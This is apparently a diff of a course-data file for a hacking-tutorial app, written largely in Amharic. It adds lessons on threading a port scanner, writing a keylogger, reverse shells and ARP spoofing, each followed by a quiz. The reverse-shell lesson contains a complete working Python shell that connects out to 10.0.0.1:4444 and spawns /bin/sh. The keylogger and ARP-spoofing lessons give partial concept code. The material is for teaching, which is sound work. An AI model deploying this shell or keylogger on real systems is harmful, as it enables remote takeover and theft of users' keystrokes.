+    "a-02", "06. Advanced Python", "6.2 Multithreading", "Advanced", "Need for speed.",
+    `# Multithreading: Need for Speed
+
+እስካሁን የሰራነው Port Scanner አንድ ፖርት ፈትሾ እስኪጨርስ ይጠብቃል። 1000 ፖርት ለመፈተሽ ደቂቃዎች ይፈጃል።
+**Threading** ማለት በአንድ ጊዜ ብዙ ሰራተኞችን (Threads) እንደማሰማራት ነው።
+
+### Implementation
+\`threading\` ሞጁልን በመጠቀም ስካነራችንን እናፈጥናለን።
+
+\`\`\`python
+import threading
+import time
+
+def scan_port(port):
+    # Simulation of scanning logic
+    time.sleep(1) # ይሄ አንድ ሰከንድ ይፈጃል እንበል
+    print(f"Scanned Port {port}")
+
+# Without Threads: 5 seconds for 5 ports
+# With Threads: ~1 second for 5 ports
+
+threads = []
+for p in range(5):
+    t = threading.Thread(target=scan_port, args=(p,))
+    threads.append(t)
+    t.start()
+\`\`\`
+`,
+    `import threading\ndef worker(n):\n    print(f"Thread {n} working...")\n\nt = threading.Thread(target=worker, args=(1,))\nt.start()`,
+    [{id:"q1", question:"Threading ዋና ጥቅሙ ምንድነው?", options:[{id:"a",text:"ኮዱን ለማሳመር"},{id:"b",text:"በርካታ ስራዎችን በአንድ ጊዜ ለመስራት (Concurrency)"},{id:"c",text:"Memory ለመቆጠብ"}], correctOptionId:"b", explanation:"Threading I/O bound ስራዎችን (እንደ Network scanning) በጣም ያፈጥናል።"}]
+  ),
+
+  // --- MODULE 7: EXPLOITATION ---
+  createLesson(
+    "a-03", "07. Exploitation", "7.1 Writing a Keylogger", "Advanced", "Spyware concepts.",
+    `# Writing a Keylogger
+
+**ማስጠንቀቂያ:** ይህ ለትምህርት ብቻ ነው። በራስህ ማሽን ላይ ብቻ ሞክረው።
+
+Keylogger ማለት ተጠቃሚው ኪቦርድ ላይ የሚነካውን ሁሉ የሚመዘግብ ማልዌር ነው። ለዚህ \`pynput\` የተባለ Library እንጠቀማለን። (በዚህ Sandbox ውስጥ ውጤቱን ብቻ ነው የምናየው)።
+
+### The Logic
+1.  **Listener:** ኪቦርዱን የሚያዳምጥ ኮድ።
+2.  **Callback Function:** ቁልፍ ሲነካ ምን ይደረግ? (ወደ ፋይል ጻፍ ወይም ወደ ሃከሩ ላክ)።
+
+\`\`\`python
+# Concept Code (Requires local setup)
+# from pynput.keyboard import Listener
+
+def on_press(key):
+    # ቁልፉን ወደ Log file መጻፍ
+    with open("log.txt", "a") as f:
+        f.write(str(key))
+
+# with Listener(on_press=on_press) as listener:
+#    listener.join()
+\`\`\`
+`,
+    `# Simulated Keylog\nkeys = ['u', 's', 'e', 'r']\nlog = "".join(keys)\nprint(f"Logged: {log}")`,
+    [{id:"q1", question:"Keylogger ዋና አላማው ምንድነው?", options:[{id:"a",text:"ፋይል ማጥፋት"},{id:"b",text:"የሚጻፈውን መረጃ መስረቅ (Password, Chat)"},{id:"c",text:"Screen መቅዳት"}], correctOptionId:"b", explanation:"Keylogger የቁልፍ ሰሌዳ ምቶች (Keystrokes) ይመዘግባል።"}]
+  ),
+
+  createLesson(
+    "a-04", "07. Exploitation", "7.2 Reverse Shells", "Advanced", "Remote Control.",
+    `# Reverse Shells
+
+ሃከሮች ሲስተሙን ከሰበሩ በኋላ (Exploit ካደረጉ በኋላ)፣ የኮምፒውተሩን Terminal/CMD ማግኘት ይፈልጋሉ።
+ሁለት አይነት ግንኙነት አለ፡
+1.  **Bind Shell:** ሃከሩ ወደ ተጠቂው ይደውላል። (Firewall ሊዘጋው ይችላል)።
+2.  **Reverse Shell:** ተጠቂው ወደ ሃከሩ ይደውላል። (Firewall ብዙ ጊዜ የወጪ ጥሪን ስለሚፈቅድ ይህ ይመረጣል)።
+
+### Python Reverse Shell (Client Side)
+ይህ ኮድ በተጠቂው ኮምፒውተር ላይ ቢሮጥ፣ CMD/Bashን ለሃከሩ ይሰጣል።
+
+\`\`\`python
+import socket
+import subprocess
+import os
+
+hacker_ip = "10.0.0.1"
+port = 4444
+
+s = socket.socket()
+s.connect((hacker_ip, port))
+
+# Redirect streams to socket (Stdin, Stdout, Stderr)
+os.dup2(s.fileno(), 0) 
+os.dup2(s.fileno(), 1) 
+os.dup2(s.fileno(), 2) 
+
+p = subprocess.call(["/bin/sh", "-i"])
+\`\`\`
+`,
+    `print("[*] Connecting back to C2...")\nprint("[+] Shell Spawned!")`,
+    [{id:"q1", question:"Reverse Shell ከ Bind Shell በምን ይሻላል?", options:[{id:"a",text:"ይፈጥናል"},{id:"b",text:"Firewallን ለማለፍ ይመረጣል"},{id:"c",text:"Code ለመጻፍ ይቀላል"}], correctOptionId:"b", explanation:"አብዛኛው Firewall ወደ ውስጥ የሚገባን ይዘጋል እንጂ የሚወጣን አይዘጋም።"}]
+  ),
+  
+  createLesson(
+    "a-05", "07. Exploitation", "7.3 ARP Spoofing", "Advanced", "Man in the Middle.",
+    `# ARP Spoofing (Man in the Middle)
+
+በ Local Network (WiFi) ውስጥ፣ ኮምፒውተሮች እርስ በርስ የሚተዋወቁት በ **MAC Address** ነው። IP Addressን ወደ MAC Address የሚቀይረው ፕሮቶኮል **ARP (Address Resolution Protocol)** ይባላል።
+
+ARP Spoofing ማለት፡
+1.  ለ Routeru: "እኔ እኮ Victim ነኝ" ብሎ መዋሸት።
+2.  ለ Victim-u: "እኔ እኮ Router ነኝ" ብሎ መዋሸት።
+
+ይህ ሲሳካ፣ የ Victim-u ሙሉ የኢንተርኔት ትራፊክ (Passowrds, Images) በእኛ ኮምፒውተር በኩል ያልፋል።
+
+### Scapy Library
+Python ላይ \`Scapy\` የተባለ Library በመጠቀም የውሸት ARP Packet መላክ ይቻላል።
+
+\`\`\`python
+# Concept
+# packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip)
+# send(packet)
+\`\`\`
+`,
+    `print("Spoofing 192.168.1.5...")\nprint("Redirecting traffic...")`,
+    [{id:"q1", question:"ARP Spoofing ምን አይነት ጥቃት ነው?", options:[{id:"a",text:"DoS"},{id:"b",text:"Man in the Middle (MitM)"},{id:"c",text:"Phishing"}], correctOptionId:"b", explanation:"ሃከሩ በመሃል ገብቶ መረጃ ይሰርቃል።"}]
+  )
 ];
 
 const CPP_LESSONS: Lesson[] = [
     { id: "cpp-1", category: "Memory", title: "1.1 Pointers", description: "Direct memory access", level: "Advanced", content: "# Pointers\nDirect memory manipulation.", starterCode: "int* p;", quiz: [] }
 ];
-
-// =====================================================================
-// HELPER FUNCTIONS
-// =====================================================================
 
 export const getCourseData = (language: Language, isBeginner: boolean = true): SyllabusItem[] => {
   const lessons = language === 'python' 
